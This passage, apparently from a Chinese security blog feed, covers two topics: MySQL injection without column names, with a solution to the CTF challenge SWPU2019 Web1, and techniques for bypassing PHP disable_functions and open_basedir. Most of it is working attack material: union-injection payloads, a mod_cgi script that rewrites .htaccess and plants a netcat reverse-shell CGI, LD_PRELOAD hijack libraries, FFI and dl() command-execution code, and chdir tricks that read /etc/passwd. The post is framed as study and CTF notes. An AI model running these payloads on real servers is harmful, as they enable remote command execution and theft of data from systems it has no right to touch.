admin)a;</span><br></pre></td></tr></table></figure><p>同时查询多个列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(&#96;2&#96;,0x2d,&#96;3&#96;) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322230016384.png" alt></p><p>简而言之，可以通过任意命名进入该表，然后使用 SELECT 查询这些字段中的任何已知值。</p><p>payload：<code>select a,b from posts where a=-1 union select 1,(select concat(</code>3<code>,0x2d,</code>4<code>) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</code></p><h3 id="0x-03-例题分析"><a href="#0x-03-例题分析" class="headerlink" title="0x 03 例题分析"></a>0x 03 例题分析</h3><h4 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h4><ol><li>注入点在广告名。点击广告详情，发现数据库的报错信息，证明存在注入。</li></ol><p>简单测试了一下，空格 和 or 被过滤，报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。</p><p>首先测试字段数量,有22个字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line">#group by获取列数</span><br><span class="line">-1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;11</span><br></pre></td></tr></table></figure><p>查看数据库版本信息,是MariaDB</p><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322231728123.png" alt></p><p>由于过滤了or,所以用mysql.innodb_table_stats查询数据表或者用sys.schema_auto_increment_columns</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322232338100.png" alt></p><p>查询users表，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322232819155.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> MySQL无列名注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypass disabled_functions &amp; open_basedir学习</title>
      <link href="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​        常见的有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web  应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有  system()、exec()、shell_exec()、passthru()，偏僻 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改  .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD  劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p><h3 id="0x-02-黑名单-bypass"><a href="#0x-02-黑名单-bypass" class="headerlink" title="0x 02 黑名单 bypass"></a>0x 02 黑名单 bypass</h3><p>众所周知，disable_functions 是基于黑名单来实现对某些函数使用的限制的，既然是黑名单有时候就难免会有漏网之鱼</p><p>PHP 中能直接执行系统程序的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">shell_exec(）</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">dl() &#x2F;&#x2F; 加载自定义 php 扩展</span><br></pre></td></tr></table></figure><p>PHP 中执行运算符（反引号）的效果和 shell_exec() 是相同的</p><h3 id="0x-03-第二种：mod-cgi-bypass介绍"><a href="#0x-03-第二种：mod-cgi-bypass介绍" class="headerlink" title="0x 03 第二种：mod_cgi bypass介绍"></a>0x 03 第二种：mod_cgi bypass介绍</h3><p>关于mode_cgi，可以参考apache的官方说明：<a href="http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html。" target="_blank" rel="noopener">http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html。</a></p><blockquote><p>“任何具有mime类型application/x-httpd-cgi或者被 cgi-script处理器(Apache 1.1或以后版本)处理的文件将被作为CGI脚本对待并由服务器运行, 它的输出将被返回给客户端。通过两种途径使文件成为CGI脚本，或者文件具有已由 AddType指令定义的扩展名，或者文件位于 ScriptAlias目录中。”，这就表示，apache允许WEB服务器与可执行文件进行交互。</p></blockquote><p>满足条件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. apache环境</span><br><span class="line">2. mod_cgi已启用</span><br><span class="line">3. htaccess的文件必须被允许，即在httpd.conf中，要注意AllowOverride选项为All</span><br><span class="line">4. 你必须能够写入文件</span><br></pre></td></tr></table></figure><p>攻击思路：先把要执行的程序写入一个特定扩展名的文件里，然后修改.htaccess文件，通过Options指令允许使用mod_cgi模块执行CGI脚本，然后再让我们特定的扩展名以cgi-script进行处理，这样我们甚至可以反弹一个shell出来。</p><p>POC如下，附注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"nc -c'/bin/bash' 127.0.0.1 4444"</span>; <span class="comment">//反弹一个shell出来，这里用本地的4444端口</span></span><br><span class="line">$shellfile =<span class="string">"#!/bin/bash\n"</span>; <span class="comment">//指定shell</span></span><br><span class="line">$shellfile .=<span class="string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="comment">//需要指定这个header，否则会返回500</span></span><br><span class="line">$shellfile .=<span class="string">"$cmd"</span>; </span><br><span class="line">functioncheckEnabled($text,$condition,$yes,$no) <span class="comment">//this surely can be shorter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$text: "</span> . ($condition ?$yes : $no) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'checked'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); </span><br><span class="line">    header(<span class="string">'Location: '</span> . $_SERVER[<span class="string">'PHP_SELF'</span>]. <span class="string">'?checked=true'</span>); <span class="comment">//执行环境的检查</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $modcgi = in_array(<span class="string">'mod_cgi'</span>,apache_get_modules()); <span class="comment">// 检测mod_cgi是否开启</span></span><br><span class="line">    $writable = is_writable(<span class="string">'.'</span>); <span class="comment">//检测当前目录是否可写</span></span><br><span class="line">    $htaccess = !<span class="keyword">empty</span>($_SERVER[<span class="string">'HTACCESS'</span>]);<span class="comment">//检测是否启用了.htaccess</span></span><br><span class="line">        checkEnabled(<span class="string">"Mod-Cgienabled"</span>,$modcgi,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"Iswritable"</span>,$writable,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"htaccessworking"</span>,$htaccess,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error. All of the above mustbe true for the script to work!"</span>; <span class="comment">//必须满足所有条件</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line"> checkEnabled(<span class="string">"Backing </span></span><br><span class="line"><span class="string">up.htaccess"</span>,copy(<span class="string">".htaccess"</span>,<span class="string">".htaccess.bak"</span>),<span class="string">"Suceeded!Saved in </span></span><br><span class="line"><span class="string">.htaccess.bak"</span>,<span class="string">"Failed!"</span>); <span class="comment">//备份一下原有.htaccess</span></span><br><span class="line">        </span><br><span class="line">checkEnabled(<span class="string">"Write </span></span><br><span class="line"><span class="string">.htaccessfile"</span>,file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"Options </span></span><br><span class="line"><span class="string">+ExecCGI\nAddHandlercgi-script </span></span><br><span class="line"><span class="string">.dizzle"</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//.dizzle，我们的特定扩展名</span></span><br><span class="line">        checkEnabled(<span class="string">"Write shellfile"</span>,file_put_contents(<span class="string">'shell.dizzle'</span>,$shellfile),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//写入文件</span></span><br><span class="line">        checkEnabled(<span class="string">"Chmod777"</span>,chmod(<span class="string">"shell.dizzle"</span>,<span class="number">0777</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//给权限</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Executing the script now.Check your listener &lt;img src = 'shell.dizzle' style ='display:none;'&gt;"</span>; <span class="comment">//调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>具体攻击方法可以看这篇文章：<a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p><h3 id="0x-04-第四种：-LD-PRELOAD-bypass介绍"><a href="#0x-04-第四种：-LD-PRELOAD-bypass介绍" class="headerlink" title="0x 04 第四种： LD_PRELOAD bypass介绍"></a>0x 04 第四种： LD_PRELOAD bypass介绍</h3><p>这里需要介绍一个前置知识：</p><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><blockquote><p>LD_PRELOAD 是 Linux 下的一个环境变量,动态链接器在载入一个程序所需的所有动态库之前,首先会载入LD_PRELOAD 环境变量所指定的动态库。</p></blockquote><p>从上面可以看出本来LD_PRELOAD的作用是利用我们加载进来的so，去覆盖相同函数名的库函数，去使用自己的函数，更加方便，但是如果自己的函数为恶意函数，就造成了恶意程序注入。</p><p>利用 putenv 设置LD_PRELOAD变量，既能绕过open basedir，又能绕过disable functions</p><h5 id="putenv可以设置环境变量"><a href="#putenv可以设置环境变量" class="headerlink" title="putenv可以设置环境变量"></a>putenv可以设置环境变量</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br></pre></td></tr></table></figure><p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。<br>如果该函数未被过滤，那么我们可以有如下骚操作：</p><p>1.制作一个恶意shared libraries<br>2.使用putenv设置LD_PRELOAD为恶意文件路径<br>3.使用某个php函数，触发specific shared library<br>4.成功进行RCE<br><img src="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/2019-03-25-15-17-11.png" alt="img"></p><p>对LD_PRELOAD的利用大概可分为两种，第一种是劫持库函数，第二种是劫持启动进程</p><ul><li>劫持库函数</li></ul><p>网上大多数都是劫持的getuid，其实能劫持的并不只getuid,我们需要劫持的函数需要满足，此函数为点：<strong>经常被用到的并且为无参数的函数</strong></p><p>比如getuid,getpid,getgid,getppid这种，具体的可以fuzz一下，应该蛮多的</p><p>具体操作过程(以geteuid的劫持为例)</p><p>hack.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload() &#123;</span><br><span class="line">        system(&quot;whoami &gt; hack&quot;);</span><br><span class="line">&#125;   </span><br><span class="line">int  geteuid() &#123;</span><br><span class="line">if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成so文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure><p>写一个hack.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);&#x2F;&#x2F;error_log(&#39;&#39;,1); </span><br><span class="line">&#x2F;&#x2F;imap_mail(&#39;a@a&#39;,1,1,1,1);</span><br><span class="line">&#x2F;&#x2F;$img &#x3D; new Imagick(&#39;test.wmv&#39;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;mail()函数执行默认是会调用外部程序sendmail的</span><br></pre></td></tr></table></figure><p>而既然要在php运行时被触发，那么势必选择一个非常常用的函数才行。这里能调用的函数不止有mail，在mail函数被ban掉的情况下也可以用error_log，imap_mail等，需要注意的是error_log的第二个参数需要设置为1表示发送邮件会调用sendmail进程，imap_mail也可调用sendmail进程，即可调用sendmail子进程，同样利用Imagick函数触发调用了新进程ffmpeg进行处理图像</p><p>imap_mail()适用于<code>PHP &lt; 5.6.2</code>的</p><p>使用Imagick函数的时候，MPEG format文件必须存在，否则无法调用<code>ffmpeg</code></p><ul><li>劫持启动进程</li></ul><p>从上面来看，劫持库函数需要找到特定的库函数去劫持，那么劫持新进程是不需要找到特定的库函数的。</p><blockquote><p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p></blockquote><p><strong>attribute</strong>((constructor))更加直接的去讲：有这个说明：</p><p><strong>它是在加载共享库时运行的，通常是在程序启动过程中</strong>，也就是当有一个新进程/子进程启动时，那么<strong>attribute</strong>((constructor))就会被直接加载，我们上面的mail等函数也正好符合这个特性，下面也接着来试一下:</p><p>hack.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hack.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">error_log(&#39;&#39;,1);</span><br></pre></td></tr></table></figure><h3 id="0x-05-其他bypass技巧介绍"><a href="#0x-05-其他bypass技巧介绍" class="headerlink" title="0x 05 其他bypass技巧介绍"></a>0x 05 其他bypass技巧介绍</h3><h4 id="外部扩展库dl-bypass介绍"><a href="#外部扩展库dl-bypass介绍" class="headerlink" title="外部扩展库dl bypass介绍"></a>外部扩展库dl bypass介绍</h4><blockquote><p>实现方法参考：<a href="https://cloud.tencent.com/developer/article/1141142" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1141142</a></p></blockquote><blockquote><table><thead><tr><th>版本</th><th>说明</th></tr></thead><tbody><tr><td>7.0.0</td><td>PHP-FPM 模式下已禁用 <strong>dl()</strong>。</td></tr><tr><td>5.3.9</td><td>尽管不推荐，但 PHP-FPM 模式下启用了 <strong>dl()</strong>。</td></tr><tr><td>5.3.0</td><td>由于稳定性，<strong>dl()</strong> 在某些 SAPI 中被禁用。仅仅允许 <strong>dl()</strong> 的 SAPI 为 CLI 和 Embed。 使用 <a href="https://www.php.net/manual/zh/ini.core.php#ini.extension" target="_blank" rel="noopener">扩展加载指令</a> 作为替代。</td></tr></tbody></table></blockquote><blockquote><p>SAPI（Server Application Programming Interface）服务器应用程序编程接口，即PHP与其他应用交互的接口，PHP脚本要执行有很多方式，通过Web服务器，或者直接在命令行下，也可以嵌入在其他程序中。</p><p>SAPI提供了一个和外部通信的接口，常见的SAPI有：cgi、fast-cgi、cli、apache模块的DLL、isapi</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server API FPM&#x2F;FastCGI</span><br></pre></td></tr></table></figure><p>条件：php.ini中需设置enable_dl=true</p><p>dl bypass-poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpdl(&quot;dl.so&quot;);  &#x2F;&#x2F;dl.so在extension_dir目录，如不在则用..&#x2F;..&#x2F;来实现调用confirm_dl_compiled(&quot;$_GET[a]&gt;;1.txt&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>主要就是dl.so这个文件的搜索，通过调用dl.so进行命令执行。</p><h4 id="PHP7-4-FFI-bypass介绍"><a href="#PHP7-4-FFI-bypass介绍" class="headerlink" title="PHP7.4-FFI bypass介绍"></a>PHP7.4-FFI bypass介绍</h4><p>在RCTF2019中出的题，考察了php7.4的新特性，通过新加的FFI即可bypass disable function</p><p>参考RCTF2019RCTF 2019 nextphp <a href="https://xz.aliyun.com/t/5218" target="_blank" rel="noopener">https://xz.aliyun.com/t/5218</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int system(const char *command);"</span>,</span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"></span><br><span class="line">$ffi-&gt;system(<span class="string">"id"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果只定义 system 函数而省略 libc.so.6 同样也是可以执行命令的，支持 RTLD_DEFAULT 的平台将尝试在常规全局范围内查找在代码中声明的符号</p><p> 当我们只能控制 FFI::cdef 函数的 lib 参数的时候，FFI::cdef 函数还可以加载我们自定义的动态链接库，但是需要填写绝对路径，否则会无法加载，比如</p><p>ffi.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">        <span class="string">"int system(const char *command);"</span>,</span><br><span class="line">        <span class="string">"/var/www/html/bad.so"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>bad.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">j0k3r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"echo Hacked &amp;&amp; id"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要加载编译好的 bad.so 即可执行恶意代码</p><h3 id="0x-06-常用的bypass链接"><a href="#0x-06-常用的bypass链接" class="headerlink" title="0x 06 常用的bypass链接"></a>0x 06 常用的bypass链接</h3><blockquote><p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">some exploits in php7</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass disable_functions via LD_PRELOAD</a> 利用劫持启动进程+mail()函数实现</p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p></blockquote><h3 id="0x-07-Bypass-open-basedir"><a href="#0x-07-Bypass-open-basedir" class="headerlink" title="0x 07 Bypass open_basedir"></a>0x 07 Bypass open_basedir</h3><h4 id="chdir-bypass"><a href="#chdir-bypass" class="headerlink" title="chdir bypass"></a>chdir bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读配置文件cmd&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(file_get_contents(&quot;&#x2F;etc&#x2F;passwd&quot;));</span><br><span class="line">列目录cmd&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&quot;&#x2F;&quot;));</span><br><span class="line">读文件md&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);readfile(&quot;&#x2F;THis_Is_tHe_F14g&quot;));</span><br></pre></td></tr></table></figure><h4 id="利用symlink-函数来Bypass"><a href="#利用symlink-函数来Bypass" class="headerlink" title="利用symlink()函数来Bypass"></a>利用symlink()函数来Bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line">* by phithon</span><br><span class="line">* From https:&#x2F;&#x2F;www.leavesongs.com</span><br><span class="line">* detail: http:&#x2F;&#x2F;cxsecurity.com&#x2F;issue&#x2F;WLB-2009110068</span><br><span class="line">*&#x2F;</span><br><span class="line">header(&#39;content-type: text&#x2F;plain&#39;);</span><br><span class="line">error_reporting(-1);</span><br><span class="line">ini_set(&#39;display_errors&#39;, TRUE);</span><br><span class="line">printf(&quot;open_basedir: %s\nphp_version: %s\n&quot;, ini_get(&#39;open_basedir&#39;), phpversion());</span><br><span class="line">printf(&quot;disable_functions: %s\n&quot;, ini_get(&#39;disable_functions&#39;));</span><br><span class="line">$file &#x3D; str_replace(&#39;\\&#39;, 